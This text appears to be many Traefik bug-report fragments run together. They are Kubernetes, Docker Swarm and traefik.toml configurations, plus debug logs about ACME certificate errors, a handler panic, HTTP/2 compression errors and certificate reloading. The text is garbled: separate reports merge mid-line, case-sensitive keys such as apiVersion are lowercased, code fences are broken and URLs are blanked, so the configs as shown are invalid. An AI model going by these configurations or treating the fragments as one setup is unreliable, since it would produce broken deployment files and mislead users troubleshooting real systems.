debu[2018-10-10t16:49:32+08:00] vulcand/oxy/forward: completed servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"wss\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"echo.websocket.org\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"upgrade\\"],\\"sec-websocket-extensions\\":[\\"permessage-deflate; client_max_window_bits\\"],\\"sec-websocket-key\\":[\\"yoe9ghwluj7jeygo0m2wpg==\\"],\\"sec-websocket-version\\":[\\"13\\"],\\"upgrade\\":[\\"websocket\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"1.us.api.foo.org:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"171.210.196.254:19766\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
debu[2018-10-10t16:49:32+08:00] vulcand/oxy/roundrobin/rr: completed servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"upgrade\\"],\\"sec-websocket-extensions\\":[\\"permessage-deflate; client_max_window_bits\\"],\\"sec-websocket-key\\":[\\"yoe9ghwluj7jeygo0m2wpg==\\"],\\"sec-websocket-version\\":[\\"13\\"],\\"upgrade\\":[\\"websocket\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"1.us.api.foo.org:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"171.210.196.254:19766\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
kubernetes 1.10.4 on azure
traefik fronted by a loadbalancer service object
backend service object: ```yaml
apiversion: v1
kind: service
metadata: annotations: prometheus.io/path: /metrics prometheus.io/port: "5555" prometheus.io/scheme: http prometheus.io/scrape: "true" traefik.ingress.kubernetes.io/buffering: | maxrequestbodybytes: 8 labels: app: frontend appcomponent: api environment: oho helm-app: frontend-oho name: frontend-oho-api namespace: oho
spec: ports: - name: api port: 80 protocol: tcp targetport: 5555 selector: app: frontend appcomponent: api environment: oho sessionaffinity: none type: clusterip
``` ingress: ```yaml
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: ingress.kubernetes.io/browser-xss-filter: "true" ingress.kubernetes.io/content-type-nosniff: "true" ingress.kubernetes.io/force-hsts: "true" ingress.kubernetes.io/frame-deny: "true" ingress.kubernetes.io/hsts-max-age: "15553000" ingress.kubernetes.io/ssl-redirect: "true" kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/rate-limit: |- extractorfunc: client.ip rateset: protectourselves: period: 2s average: 50 burst: 150 traefik.ingress.kubernetes.io/redirect-entry-point: https traefik.ingress.kubernetes.io/rule-type: pathprefixstrip labels: helm-app: frontend-oho name: ingress-api-traefik namespace: oho
spec: rules: - host: oho.domain.com http: paths: - backend: servicename: frontend-oho-api serviceport: 80 path: /api tls: - hosts: - oho.domain.com secretname: oho-domain.com
``` configmap mounted in traefik container: ```yaml
apiversion: v1
- apiversion: v1 data: traefik.toml: | # traefik.toml loglevel = "debug" debug = false sendanonymoususage = true defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] regex = "^ " replacement = " " [entrypoints.http.forwardedheaders] trustedips = ["127.0.0.1/32"] [entrypoints.https] address = ":443" compress = true [entrypoints.https.forwardedheaders] trustedips = ["127.0.0.1/32"] [entrypoints.https.tls] # exclude old tls versions, whitelist known still-strong cipher suites minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_aes_128_cbc_sha", "tls_ecdhe_rsa_with_aes_256_cbc_sha" ] [entrypoints.httpn] address = ":8880" compress = true [kubernetes] [traefiklog] [accesslog] [metrics] [metrics.prometheus] [metrics.statistics] [ping] [api] [retry] attempts = 2 kind: configmap metadata: name: traefik-config namespace: ingress
``` traefik pod: ```yaml
```apiversion: v1
- apiversion: v1 kind: pod metadata: annotations: checksum/config: bd0bd0dafbb6f0ae3b471f35e0c73750f887121d0494eee81fb55a2e25520459 cni.projectcalico.org/podip: 10.244.7.111/32 labels: name: traefik-ingress-controller name: traefik-ingress-controller-86949d84c5-p9m8w namespace: ingress spec: containers: - args: - --configfile=/config/traefik.toml image: traefik:1.7.2-alpine imagepullpolicy: always name: traefik-ingress-controller ports: - containerport: 80 name: http protocol: tcp - containerport: 443 name: https protocol: tcp - containerport: 8880 name: httpn protocol: tcp - containerport: 8080 name: dashboard protocol: tcp volumemounts: - mountpath: /config name: config readonly: true dnspolicy: clusterfirst restartpolicy: always volumes: - configmap: defaultmode: 420 name: traefik-config name: config
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-10-10t09:02:44z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2018-10-10t09:02:44z" level=debug msg="vulcand/oxy/buffer: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/k8s/body\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"*/*\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"connection\\":[\\"keep-alive\\"],\\"user-agent\\":[\\"httpie/0.9.9\\"],\\"x-forwarded-prefix\\":[\\"/api\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"oho.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"8.8.8.8:54802\\",\\"requesturi\\":\\"/k8s/body\\",\\"tls\\":null}"
time="2018-10-10t09:02:44z" level=debug msg="vulcand/oxy/buffer: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/k8s/body\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"*/*\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"connection\\":[\\"keep-alive\\"],\\"user-agent\\":[\\"httpie/0.9.9\\"],\\"x-forwarded-prefix\\":[\\"/api\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"oho.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"8.8.8.8:54802\\",\\"requesturi\\":\\"/k8s/body\\",\\"tls\\":null}"
time="2018-10-10t09:02:44z" level=error msg="recovered from panic in http handler: runtime error: invalid memory address or nil pointer dereference"
time="2018-10-10t09:02:45z" level=debug msg="received kubernetes event kind *v1.endpoints" ```
services: traefik: image: traefik:1.7-alpine command: - "--loglevel=debug" - "--checknewversion=false" - "--insecureskipverify=true" - "--defaultentrypoints=http,https" - "--entrypoints=name:http address::80 compress:false redirect.entrypoint:https" - "--entrypoints=name:https address::443 tls tls.minversion:versiontls12 compress:false" - "--api" - "--api.statistics" - "--metrics" - "--metrics.prometheus" - "--ping" - "--docker" - "--docker.watch" - "--docker.exposedbydefault=false" - "--docker.swarmmode" ..
deploy: labels: traefik.enable: "true" traefik.docker.network: "overlay" traefik.port: "8443" traefik.protocol: "https" traefik.frontend.passhostheader: "true" traefik.frontend.rule: "host:api.example.com;pathprefix:/path1,/path2"
``` stripped out unimportant details
i already tried do disable compression on the backend, but the issue still happens
only workaround is to downgrade back to v1.6.6 tomcat uses self signed certificate (ec, prime256v1) for the sake of completeness, this is the tomcat connector config
<connector port="8443" protocol="org.apache.coyote.http11.http11aprprotocol" executor="tomcatthreadpool" sslenabled="true" acceptorthreadcount="2" compression="off" connectiontimeout="120000" sendreasonphrase="true" > <upgradeprotocol classname="org.apache.coyote.http2.http2protocol" /> <sslhostconfig> <certificate certificatekeyfile="/path/to/localhost.key" certificatefile="/path/to/localhost.pem" type="ec" /> </sslhostconfig>
</connector>
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
level=debug msg="\'500 internal server error\' caused by: connection error: compression_error"
level=debug msg="vulcand/oxy/forward/http: round trip: code: 500, length: 21, duration: 8.800802ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:api.example.com"
here is traefik.toml file
debug = true defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [acme]
email = "admin@aufomm.pw"
storage = "acme.json"
entrypoint = "https" [acme.dnschallenge] provider = "gandiv5" delaybeforecheck = 0 [[acme.domains]] main = "*.aufomm.pw" sans = ["aufomm.pw"]
``` provider : google cloud instance in singapore
os : debian 9 ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-10-04t06:29:08z" level=debug msg="using dns challenge provider: gandiv5"
time="2018-10-04t06:45:12z" level=debug msg="serving default cert for request: \\"traefik.aufomm.pw\\""
time="2018-10-04t06:45:13z" level=debug msg="serving default cert for request: \\"traefik.aufomm.pw\\""
time="2018-10-04t06:45:13z" level=debug msg="http2: server: error reading preface from client 113.29.30.137:52853: remote error: tls: bad certificate"
time="2018-10-04t06:45:13z" level=debug msg="http2: server: error reading preface from client 113.29.30.137:34382: remote error: tls: bad certificate"
time="2018-10-04t06:49:31z" level=error msg="error obtaining certificate retrying in 387.776384ms"
time="2018-10-04t07:09:53z" level=error msg="error obtaining certificate: acme:error -> one or more domains had a problem:\ [aufomm.pw] time limit exceeded
last error: ns ns-231-b.gandi.net
did not return the expected txt record\ "
time="2018-10-04t07:09:53z" level=error msg="unable to obtain acme certificate for domains \\"*.aufomm.pw,aufomm.pw\\" : unable to generate a certificate for thedomains [*.aufomm.pw aufomm.pw]: acme: error -> one or more domains had a problem:\ [aufomm.pw] time limit exceeded
last error: ns ns-231-b.gandi.net
did notreturn the expected txt record\ "
[marathon] endpoint = " " domain = "example.com" exposedbydefault = true respectreadinesschecks = true
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "web": null, "docker": null, "file": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "configfile": ""
``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
info[2018-10-03t09:55:35-03:00] starting provider *file.provider {"watch":true,"filename":"/etc/ssl.toml","constraints":null,"trace":false,"templateversion":0,"debugloggeneratedtemplate":fal
se,"directory":"","traefikfile":"/home/daltonmatos/sievegroup/sieve/docker-traefik/config.toml"}
warn[2018-10-03t09:55:35-03:00] clienttls is nil
debu[2018-10-03t09:55:35-03:00] configuration received from provider file: {"tls":[{"entrypoints":["https"],"certificate":{"certfile":"/etc/cert1/fullchain.pem","keyfile":"/etc/cert1/privkey.pem"}}]}
debu[2018-10-03t09:55:35-03:00] add certificate for domains *.<redacted>.com.br
info[2018-10-03t09:55:35-03:00] server configuration reloaded on :8082
info[2018-10-03t09:55:35-03:00] server configuration reloaded on :80
info[2018-10-03t09:55:35-03:00] server configuration reloaded on :443
debu[2018-10-03t09:55:50-03:00] configuration received from provider file: {"tls":[{"entrypoints":["https"],"certificate":{"certfile":"/etc/cert2/fullchain.pem","keyfile":"/etc/cert2/privkey.pem"}}]}
debu[2018-10-03t09:55:50-03:00] add certificate for domains *.<redacted>.com.br
info[2018-10-03t09:55:50-03:00] server configuration reloaded on :80
info[2018-10-03t09:55:50-03:00] server configuration reloaded on :443
info[2018-10-03t09:55:50-03:00] server configuration reloaded on :8082
debu[2018-10-03t09:55:54-03:00] configuration received from provider file: {"tls":[{"entrypoints":["https"],"certificate":{"certfile":"/etc/cert1/fullchain.pem","keyfile":"/etc/cert1/privkey.pem"}}]}
debu[2018-10-03t09:55:56-03:00] add certificate for domains *.<redacted>.com.br
info[2018-10-03t09:55:56-03:00] server configuration reloaded on :80
info[2018-10-03t09:55:56-03:00] server configuration reloaded on :443
info[2018-10-03t09:55:56-03:00] server configuration reloaded on :8082
erro[2018-10-03t09:57:35-03:00] failed to retrieve marathon applications: all the marathon hosts are presently down
``` for now on, even changing the contents of `/etc/ssl.toml`, traefik does not detect this change and does not reload the certificates
**important note:** i was only able to reproduce this when i started traefik with marathon **turned off**
when i started traefik with matathon already started, all works
even when i remove every app from marathon and then stop it
but if i later start marathon, traefik does not start to detect the file changes, although it receives new updates from marathon: ```
erro[2018-10-03t10:19:02-03:00] failed to retrieve marathon applications: all the marathon hosts are presently down debu[2018-10-03t10:19:45-03:00] received provider event type: deployment_info, event: &{deployment_info %!s(*marathon.stepactions=&{[{scaleapplication /sleep}]}) 2018-10-03t13:19:45.729z %!s(*marathon.deploymentplan=&{8ebc3a31-cf6c-4c71-8a1e-b081de2af445 2018-10-03t13:19:45.599z [ ]})} debu[2018-10-03t10:19:45-03:00] originlabelsmap[] debu[2018-10-03t10:19:45-03:00] alllabelsmap[:map[]] debu[2018-10-03t10:19:45-03:00] originlabelsmap[] debu[2018-10-03t10:19:45-03:00] alllabelsmap[:map[]]
let me see if you need any new information and i will provide it.
defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80" [kubernetes] [kubernetes.ingressendpoint] publishedservice = "default/traefik-ingress-controller
<summary>configuration</summary> ![screenshot-bpconcjcammlapcogcnnelfmaeghhagj-2018 09 30-12-17-56]( </details>
checknewversion = false
loglevel = "warn"
defaultentrypoints = ["http","https"]
insecureskipverify = true [entrypoints] [entrypoints.http] address = ":20080" [entrypoints.https] address = ":20443" [entrypoints.https.tls] [entrypoints.traefik-admin] address = "127.0.0.1:28080" [ping]
entrypoint = "http" [metrics] [metrics.prometheus] buckets=[0.1,0.3,1.2,5.0] entrypoint = "traefik-admin" [metrics.statistics] recenterrors = 10 [traefiklog] filepath = "/var/log/traefik.log" format = "json" [lifecycle] requestacceptgracetimeout = "25s" gracetimeout = "15s" [forwardingtimeouts] dialtimeout = "5s" responseheadertimeout = "60s" [api] entrypoint = "traefik-admin" dashboard = true [api.statistics] recenterrors = 10 [kubernetes] ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```json
{"level":"error","msg":"near line 117 (last key parsed \'backends.simpleserver.xxxxxxxxxx\'): expected \'.\' or \']\' to end table name, but got \'0\' instead","time":"2018-09-28t18:51:01z"}
checknewversion = false
providersthrottleduration = "5s"
loglevel = "info" [traefiklog] filepath = "/var/log/traefik/traefik.log" format = "json" [accesslog]
filepath = "/var/log/traefik/access.log"
format = "json" defaultentrypoints = ["http"]
[entrypoints] [entrypoints.httpredirect] address = ":81" [entrypoints.http] address = ":80" [web]
address = ":8080"
[web.metrics.datadog]
address = "localhost:8125"
pushinterval = "10s" [consulcatalog]
constraints = ["tag==environment:prod","tag==lb_id:external-api01"]
watch = true
endpoint = "127.0.0.1:8500"
exposedbydefault = false [lifecycle] requestacceptgracetimeout = "30s" gracetimeout = "15s"
defaultentrypoints = ["https", "http"]
rootcas = [ "/etc/traefik/digicert-ca.crt" ] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "cert/tls.crt" keyfile = "cert/tls.key"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-09-26t18:34:16z" level=debug msg="add certificate for domains *.redacted.com,*.redacted.com,*.redacted.com"
time="2018-09-26t18:34:43z" level=debug msg="serving default cert for request: \\"redacted.us-west-2.elb.amazonaws.com\\""
toml doesn't apply raspberry pi 3 running latest raspian (debian stretch)
$ docker version
client: version: 18.06.1-ce api version: 1.38 go version: go1.10.3 git commit: e68fc7a built: tue aug 21 17:30:52 2018 os/arch: linux/arm experimental: false server: engine: version: 18.06.1-ce api version: 1.38 (minimum version 1.12) go version: go1.10.3 git commit: e68fc7a built: tue aug 21 17:26:37 2018 os/arch: linux/arm experimental: false
**traefik.toml**
defaultentrypoints = ["http", "https"]
loglevel = "info" [api] dashboard = true
[entrypoints] [entrypoints.debug] address = ":10000" compress = true [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" compress = true [acme]
email="info@my-domain.com"
acmelogging=true
storage="/etc/traefik/acme/acme.json"
entrypoint = "https"
onhostrule = true
ondemand = true [acme.httpchallenge] entrypoint = "http" [docker]
swarmmode = true
domain = "my-domain.pro"
watch = true
``` **stack.yml**
services: test1: image: company/service1:v123 networks: - frontend deploy: mode: replicated replicas: 2 resources: limits: memory: 256m labels: traefik.backend.loadbalancer.swarm: "false" traefik.frontend.rule: "host:test1.my-domain.pro" traefik.frontend.passhostheader: "true" traefik.frontend.entrypoints: "http,https" traefik.port: "80" traefik.docker.network: "frontend" test2: image: company/service2:v123 networks: - backend deploy: mode: replicated replicas: 2 resources: limits: memory: 256m labels: traefik.backend.loadbalancer.swarm: "false" traefik.frontend.passhostheader: "true" traefik.frontend.entrypoints: "debug" traefik.port: "80" traefik.docker.network: "backend" networks: frontend: external: true backend: external: true
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-09-22t20:17:11z" level=error msg="unable to obtain acme certificate for domains \\"test2.my-domain.pro\\" detected thanks to rule \\"host:stack-test2.my-domain.pro\\" : unable to generate a certificate for the domains [stack-test2.my-domain.pro]: acme: error -> one or more domains had a problem:\ [stack-test2.my-domain.pro] acme: error 403 - urn:ietf:params:acme:error:unauthorized - invalid response from [34.234.134.165]: 503\ "
alpine, docker swarm, gce debian linux instance-1 4.9.0-8-amd64 #1 smp debian 4.9.110-3+deb9u4 (2018-08-21) x86_64 gnu/linux
docker version 18.06.1-ce, build e68fc7a ```yml
--acme.acmelogging
--acme.dnschallenge
--acme.dnschallenge.provider=gcloud
--acme.domains='*.example.com,example.com'
--acme.email=snipped@example.com
--acme.entrypoint=https
--acme.ondemand=false
--acme.storage=/lets/acme.json
--checknewversion=false
--defaultentrypoints=https,http
--docker.domain=example.com
--docker.exposedbydefault=false
--docker.swarmmode
--docker.watch
--entrypoints='name:http address::80 redirect.entrypoint:https'
--entrypoints='name:https address::443 tls auth.forward.address:
--loglevel=info
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
2018-09-21 14:43:59 info using toml configuration file /traefik.toml
2018-09-21 14:43:59 warning web provider configuration is deprecated, you should use these options : api, rest provider, ping and metrics
2018-09-21 14:43:59 info traefik version v1.7.0-rc5 built on 2018-09-18_01:50:00pm
2018-09-21 14:43:59 info \ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\
2018-09-21 14:43:59 info preparing server http &{address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
2018-09-21 14:43:59 info preparing server https &{address::443 tls: redirect:<nil> auth: whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
2018-09-21 14:43:59 info starting server on :80
2018-09-21 14:43:59 info starting server on :443
2018-09-21 14:43:59 info preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
2018-09-21 14:43:59 info starting provider configuration.provideraggregator {}
2018-09-21 14:43:59 info starting server on :8080
2018-09-21 14:43:59 info starting provider *docker.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"domain\\":\\"example.com\\",\\"tls\\":null,\\"exposedbydefault\\":false,\\"usebindportip\\":false,\\"swarmmode\\":true,\\"network\\":\\"\\"}
2018-09-21 14:43:59 info starting provider *acme.provider {\\"email\\":\\"snipped@example.com\\",\\"acmelogging\\":true,\\"caserver\\":\\" ",\\"storage\\":\\"/lets/acme.json\\",\\"entrypoint\\":\\"https\\",\\"keytype\\":\\"\\",\\"onhostrule\\":false,\\"ondemand\\":false,\\"dnschallenge\\":{\\"provider\\":\\"gcloud\\",\\"delaybeforecheck\\":0},\\"httpchallenge\\":null,\\"tlschallenge\\":null,\\"domains\\":[{\\"main\\":\\"*.example.com\\",\\"sans\\":[\\"example.com\\"]}],\\"store\\":{}}
2018-09-21 14:43:59 info testing certificate renew...
2018-09-21 14:43:59 info the key type is empty
use default key type 4096.
2018-09-21 14:44:01 info server configuration reloaded on :443
2018-09-21 14:44:01 info server configuration reloaded on :8080
2018-09-21 14:44:01 info server configuration reloaded on :80
2018-09-21 14:44:04 info server configuration reloaded on :80
2018-09-21 14:44:04 info server configuration reloaded on :443
2018-09-21 14:44:04 info server configuration reloaded on :8080
2018-09-21 14:44:15 info register..
2018-09-21 14:44:15 info legolog: [info] acme: registering account for snipped@example.com
2018-09-21 14:44:15 info legolog: [info] [*.example.com, example.com] acme: obtaining bundled san certificate
2018-09-21 14:44:16 info legolog: [info] [*.example.com] authurl:
2018-09-21 14:44:16 info legolog: [info] [example.com] authurl:
2018-09-21 14:44:16 info legolog: [info] [example.com] acme: preparing to solve dns-01
2018-09-21 14:44:17 info legolog: [info] [example.com] acme: preparing to solve dns-01
2018-09-21 14:44:18 info legolog: [info] [example.com] acme: trying to solve dns-01
2018-09-21 14:44:18 info legolog: [info] [example.com] checking dns record propagation using [127.0.0.11:53]
2018-09-21 14:47:21 error error obtaining certificate retrying in 656.567213ms
2018-09-21 14:47:22 info legolog: [info] [*.example.com, example.com] acme: obtaining bundled san certificate
2018-09-21 14:47:22 info legolog: [info] [*.example.com] authurl:
2018-09-21 14:47:22 info legolog: [info] [example.com] authurl:
2018-09-21 14:47:22 info legolog: [info] [example.com] acme: preparing to solve dns-01
2018-09-21 14:47:23 info legolog: [info] [example.com] acme: preparing to solve dns-01
2018-09-21 14:47:24 info legolog: [info] [example.com] acme: trying to solve dns-01
2018-09-21 14:47:24 info legolog: [info] [example.com] checking dns record propagation using [127.0.0.11:53]
2018-09-21 14:47:30 info legolog: [info] [example.com] the server validated our request
2018-09-21 14:47:30 info legolog: [info] [example.com] acme: trying to solve dns-01
2018-09-21 14:47:30 info legolog: [info] [example.com] checking dns record propagation using [127.0.0.11:53]
2018-09-21 14:48:27 error error obtaining certificate retrying in 404.33751ms
2018-09-21 14:48:27 info legolog: [info] [*.example.com, example.com] acme: obtaining bundled san certificate
2018-09-21 14:48:27 info legolog: [info] [*.example.com] authurl:
2018-09-21 14:48:27 info legolog: [info] [example.com] authurl:
2018-09-21 14:48:27 info legolog: [info] [example.com] acme: authorization already valid; skipping challenge
2018-09-21 14:48:27 info legolog: [info] [example.com] acme: preparing to solve dns-01
2018-09-21 14:48:29 info legolog: [info] [example.com] acme: trying to solve dns-01
2018-09-21 14:48:29 info legolog: [info] [example.com] checking dns record propagation using [127.0.0.11:53]
2018-09-21 14:49:35 info legolog: [info] [example.com] the server validated our request
2018-09-21 14:49:35 info legolog: [warn] error cleaning up example.com: googlecloud: <nil> 2018-09-21 14:49:35 info legolog: [info] [*.example.com, example.com] acme: validations succeeded; requesting certificates
2018-09-21 14:49:43 info legolog: [info] [*.example.com] server responded with a certificate.
2018-09-21 14:49:44 info server configuration reloaded on :80
2018-09-21 14:49:44 info server configuration reloaded on :443
2018-09-21 14:49:44 info server configuration reloaded on :8080
```args "--api", "--docker", "--docker.swarmmode", "--docker.watch", "--loglevel=debug", "--respondingtimeouts.idletimeout=3s", "--maxidleconnsperhost=20", "--forwardingtimeouts.dialtimeout=3s", "--forwardingtimeouts.responseheadertimeout=3s"
running in docker 17.12.1-ce on ubuntu, cloudflare provider
acme config: ```
#caserver = " "
email = "----------"
storage = "/acme.json"
entrypoint = "https"
acmelogging = true
ondemand = true
onhostrule = true [acme.dnschallenge] provider = "cloudflare" delaybeforecheck = 0 [acme.httpchallenge] entrypoint = "http" [[acme.domains]] main = "*.-------" sans = ["----"]
<more domains>
arguments: ```
cmd ["--api","--docker","--docker.domain=docker.localhost","--loglevel=info"]
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) i currently have no way to change to log level (i am doing this all via my phone on vacation...)
time="2018-09-14t07:20:29z" level=info msg="renewing certificate from le : {main:*.------ sans:[------]}"
time="2018-09-14t07:20:59z" level=error msg="error renewing certificate from le: {*.------ [------]}, acme: error -> one or more domains had a problem:\ [------] acme: error 403 - urn:ietf:params:acme:error:unauthorized - incorrect txt record \\"<content of first txt record>\\" found at _acme-challenge.------\ "
``` cloudflare audit log:
(first added txt is the one that gets return, second one is what acme expects)
2018-09-14t07:20:59z | delete | true | account | {"actor_email":"------","content":"------","name":"_acme-challenge.------","zone_id":"------","zone_name":"------"}
2018-09-14t07:20:46z | add | true | dns_record | {"actor_email":"------","content":"------","name":"_acme-challenge.------","proxied":false,"ttl":"120","type":"txt","zone_id":"------","zone_name":"------"}
2018-09-14t07:20:45z | delete | true | account | {"actor_email":"------","content":"------","name":"_acme-challenge.------","zone_id":"------","zone_name":"------"}
2018-09-14t07:20:31z | add | true | dns_record | {"actor_email":"------","content":"------","name":"_acme-challenge.------","proxied":false,"ttl":"120","type":"txt","zone_id":"------","zone_name":"---------"}
kubernetes v1.9.6
``` ```yaml
apiversion: extensions/v1beta1
kind: ingress
metadata: name: domain-ingress annotations: kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/preserve-host: "true"
spec: rules: - host: "accounts.domain.com" http: paths: - path: / backend: servicename: account-service serviceport: 9001 - host: "admin.domain.com" http: paths: - path: / backend: servicename: admin-service serviceport: 9002 - host: "*.domain.com" http: paths: - path: / backend: servicename: client-service serviceport: 9003
debug = false loglevel = "debug"
defaultentrypoints = ["https","http"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [retry] [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "sub.mydomain.tld"
watch = true
exposedbydefault = false [acme]
email = "me@mydomain.tld"
storage = "acme.json"
entrypoint = "https"
onhostrule = true
caserver = " " [acme.dnschallenge] provider = "ns1" delaybeforecheck = 0 [web]
address = ":8080"
``` i guess this has something to do with commit
did this commit already land in traefik? as far as i understood traefik uses lego.
defaultentrypoints = ["https"]
rootcas = [ "/etc/ssl/certs/internal.pem" ] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.traefik] address = ":8080" [entrypoints.traefik.tls] [[entrypoints.traefik.tls.certificates]] certfile = "/etc/ssl/certs/server.cert.pem" keyfile = "/etc/ssl/certs/server.key.pem" [entrypoints.https] address = ":443" [entrypoints.https.tls] [acme] email = "internal@domain.com" storage = "/etc/traefik/acme.json" entrypoint = "https" acmelogging = false onhostrule = true keytype = "ec256" [acme.dnschallenge] provider = "exec" delaybeforecheck = 0 [[acme.domains]] main = "*.domain.com" [[acme.domains]] main = "*.dev.domain.com" [[acme.domains]] main = "*.test.domain.com" [consulcatalog] endpoint = "172.17.0.1:8500" exposedbydefault = false domain = "domain.com" [consulcatalog.tls] ca = "/etc/ssl/certs/intermediate.pem" cert = "/etc/ssl/certs/internal/client.cert.pem" key = "/etc/ssl/certs/internal/client.key.pem" [api] entrypoint = "traefik" dashboard = true [api.statistics] recenterrors = 10 [metrics] [metrics.prometheus] entrypoint = "traefik" buckets=[0.1,0.3,1.2,5.0]
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) from traefik 1.7.0-rc3
time="2018-09-07t07:23:10z" level=debug msg="add certificate for domains *.domain.com"
time="2018-09-07t07:23:10z" level=debug msg="add certificate for domains *.dev.domain.com"
time="2018-09-07t07:23:10z" level=debug msg="add certificate for domains *.test.domain.com"
time="2018-09-07t07:23:12z" level=debug msg="add certificate for domains *.dev.domain.com,*.anotherdomain.com,*.domain.com,*.test.domain.com,127.0.0.1,172.17.0.1"
